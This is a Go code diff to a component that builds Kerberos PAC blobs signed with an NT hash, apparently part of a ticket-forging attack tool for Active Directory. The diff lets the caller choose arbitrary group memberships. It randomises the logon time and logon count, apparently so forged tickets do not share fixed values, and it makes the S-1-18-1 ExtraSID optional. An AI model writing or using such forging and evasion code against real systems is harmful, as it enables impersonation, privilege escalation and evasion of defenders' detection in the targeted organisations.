@@ -40,9 +40,6 @@ const (
 	signatureKeyBytes = "signaturekey\x00"
 	userFlagNormal    = 0x20
 	primaryGroupRID   = 513 // Domain Users
-	groupCount        = 2
-	groupRID1         = 515 // Domain Computers
-	groupRID2         = 527 // Key Admins
 )
 
 // BuildParams holds the input data for PAC construction.
@@ -55,7 +52,9 @@ type BuildParams struct {
 	UPN           string
 	FullName      string
 	ServerName    string
+	GroupRIDs     []uint32
 	NTHash        []byte
+	extraSID      bool
 }
 
 // Builder constructs PAC blobs. Use NewBuilder for a configured instance.
@@ -68,12 +67,17 @@ type Builder struct {
 // NewBuilder creates a PAC builder for the given parameters.
 func NewBuilder(params *BuildParams) *Builder {
 	ft := filetimeNow()
-	return &Builder{
+	b := &Builder{
 		params:   params,
 		now:      ft,
 		authTime: ft,
 	}
+	b.params.extraSID = true
+	return b
 }
+
+// DisableExtraSID removes the S-1-18-1 ExtraSID from the PAC.
+func (b *Builder) DisableExtraSID() { b.params.extraSID = false }
 
 // SetAuthTime overrides the LogOnTime used in KerbValidationInfo and ClientInfo.
 func (b *Builder) SetAuthTime(ft uint64) {
@@ -118,7 +122,7 @@ func (b *Builder) encodeKerbValidationInfo() ([]byte, error) {
 	bServerName := utf16Encode(serverOrDC(p))
 	bDomainName := utf16Encode(p.DomainNetBIOS)
 
-	logonTime := b.authTime - ftMinutes(10)
+	logonTime := b.authTime - ftMinutes(5+randInt(25))
 	logoffTime := uint64(math.MaxInt64)
 	pwdLastSet := b.now - ftDays(10)
 	pwdCanChange := pwdLastSet + ftDays(1)
@@ -160,7 +164,7 @@ func (b *Builder) encodeKerbValidationInfo() ([]byte, error) {
 	putRPCUnicodeString(&body, 0, 0, 0x00020018) // HomeDrive
 
 	// uint16: LogonCount, BadPasswordCount (4 bytes)
-	putU16(&body, 5)
+	putU16(&body, uint16(10+randInt(490)))
 	putU16(&body, 0)
 
 	// uint32: UserID (RID), PrimaryGroupID (8 bytes)
@@ -168,7 +172,9 @@ func (b *Builder) encodeKerbValidationInfo() ([]byte, error) {
 	putU32(&body, primaryGroupRID)  // 513 = Domain Users
 
 	// GroupCount + GroupPointer (8 bytes)
-	putU32(&body, groupCount)        // 2 groups
+	gr := p.GroupRIDs
+	if len(gr) == 0 { gr = []uint32{513, 515} }
+	putU32(&body, uint32(len(gr)))
 	putU32(&body, 0x0002001c)        // pointer to GroupIDs
 
 	// UserFlags (4 bytes)
@@ -200,9 +206,14 @@ func (b *Builder) encodeKerbValidationInfo() ([]byte, error) {
 	putU32(&body, 0)
 	putU32(&body, 0)
 
-	// ExtraSIDs (8 bytes)
-	putU32(&body, 1)             // ExtraSIDCount
-	putU32(&body, 0x0002002c)    // ExtraSIDPointer
+	if b.params.extraSID {
+		// ExtraSIDs
+		putU32(&body, 1)             // ExtraSIDCount
+		putU32(&body, 0x0002002c)    // ExtraSIDPointer
+	} else {
+		putU32(&body, 0)
+		putU32(&body, 0)
+	}
 
 	// ResourceGroup fields (12 bytes)
 	putU32(&body, 0) // ResourceDomainIDPointer (null)
@@ -233,10 +244,11 @@ func (b *Builder) encodeKerbValidationInfo() ([]byte, error) {
 	// HomeDrive: 12 zeros
 	refs.Write(make([]byte, 12))
 
-	// GroupIDs: Count + [RID, Attrs] * groupCount
-	putU32(&refs, groupCount)
-	putGroupMembership(&refs, groupRID1, 7)
-	putGroupMembership(&refs, groupRID2, 7)
+	// GroupIDs: Count + [RID, Attrs] * len(gr)
+	putU32(&refs, uint32(len(gr)))
+	for _, rid := range gr {
+		putGroupMembership(&refs, rid, 7)
+	}
 
 	// ServerName: NDR conformant varying
 	putNDRStringWithTotal(&refs, bServerName, len(bServerName)/2+1)
@@ -251,11 +263,15 @@ func (b *Builder) encodeKerbValidationInfo() ([]byte, error) {
 	refs.Write(domainSID)
 
 	// ExtraSIDs: Count + Pointer + Attrs + SID binary
-	putU32(&refs, 1) // SID count
-	putU32(&refs, 0x00020030)
-	putU32(&refs, 7) // Attributes
-	putU32(&refs, 1) // SID size (sub-authority count)
-	refs.Write([]byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x01, 0x00, 0x00, 0x00}) // S-1-18-1
+	if b.params.extraSID {
+		putU32(&refs, 1)
+		putU32(&refs, 0x00020030)
+		putU32(&refs, 7)
+		putU32(&refs, 1)
+		refs.Write([]byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x01, 0x00, 0x00, 0x00})
+	} else {
+		putU32(&refs, 0); putU32(&refs, 0)
+	} // S-1-18-1
 
 	// Assemble: body + deferred refs
 	kviBuf := make([]byte, body.Len()+refs.Len())
@@ -425,6 +441,12 @@ func utf16Encode(s string) []byte {
 		binary.Write(&buf, binary.LittleEndian, uint16(r))
 	}
 	return buf.Bytes()
+}
+
+func randInt(n int) int {
+	b := make([]byte, 4)
+	cryptorand.Read(b)
+	return int(binary.BigEndian.Uint32(b)) % n
 }
 
 func filetimeNow() uint64 {
